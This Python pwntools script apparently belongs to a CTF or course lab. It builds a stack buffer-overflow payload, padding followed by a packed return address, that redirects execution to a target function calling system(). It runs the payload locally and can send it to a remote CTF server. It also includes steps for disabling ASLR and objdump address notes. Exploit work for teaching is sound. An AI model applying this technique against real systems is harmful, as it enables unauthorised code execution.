
# Run using:
# cls && python3 gen_payload.py && sudo ./../demo < demo_pl.bin

# Important:
# sudo sysctl -w kernel.randomize_va_space=0

# Import libs
import struct
from pwn import *
from subprocess import *
import os


# TRY A PAYLOAD
# Arg1 = Name of prog (e.g. demo)
# Arg2 = Payload length (e.g. 88)
# Arg3 = Address of explotiable func (e.g. 0x0000000000401142)
# Arg4 = Try on offline
# Arg5 = Try online
def try_payload(progName, plen, addr, offline, online):

    # Info
    print("try_payload({},{},{})".format(progName, plen, addr))

    # Create payload file
    fileName = progName + '_pl.bin'
    file = open(fileName, 'wb')

    # Create payload bytes
    payload_bytes = b'A' * plen + struct.pack('<Q', int(addr, base=16))

    # Save into file and close
    file.write(payload_bytes)
    file.close()
    
    # Notify 
    # print("Created payload: " + fileName)

    # If offline, make easier
    if offline:
        # Command
        cmd = ("sudo ./../{} < {}").format(progName, fileName)
        print("\nCommand to try payload on offline version: ", cmd)
        
        # Create script
        script_name = "run.sh"
        cmd2 = ("echo '{}' > " + script_name).format(cmd)
        os.system(cmd2)
        # print("Saved command to script: " + script_name)

        # Note: near impossible to run within python

    # If online + SECUREAPP, send
    if online and progName.__contains__("secure"):

        # Notify
        print("\nTrying payload on online version...")

        # Connect to CTF site
        c = remote('cits4projtg.cybernemosyne.xyz', 1002)
        
        # Send line with payload bytes
        c.sendline(payload_bytes)
        
        # Receive and print lines
        for line in c.recvlines(numlines=12):
            print(str(line, 'UTF-8')) 


    # Space
    print("")




# RUN
print("\n############# BOF #############\n")


# WORKS FOR CTF
# try_payload("secureapp", 219, "0x000000000040125f", False, True)

# WORKS FOR DEMO (SOMEHOW)
try_payload("demo", 88, "0x000000000040117b", True, False)


# WHAT SHOULD WORK FOR DEMO
# try_payload("demo", 88, "0x0000000000401176", True, False)

# Get user input, used for trying values via scripting
# user_plen = int(sys.argv[1])
# try_payload("demo", user_plen, "0x0000000000401176", True, False)



# To get addresses:
# objdump -d ../demo | grep "executeme" -A 10
#
# 0000000000401176 <executeme>:
#   401176:       f3 0f 1e fa             endbr64
#   40117a:       55                      push   %rbp
#   40117b:       48 89 e5                mov    %rsp,%rbp
#   40117e:       48 8d 3d 83 0e 00 00    lea    0xe83(%rip),%rdi        # 402008 <_IO_stdin_used+0x8>
#   401185:       e8 d6 fe ff ff          callq  401060 <system@plt>
#   40118a:       90                      nop
#   40118b:       5d                      pop    %rbp
#   40118c:       c3                      retq

# SECURE APP address
# objdump -d ../secureapp | grep "exploitme" -A 10
# 000000000040125f <exploitme>: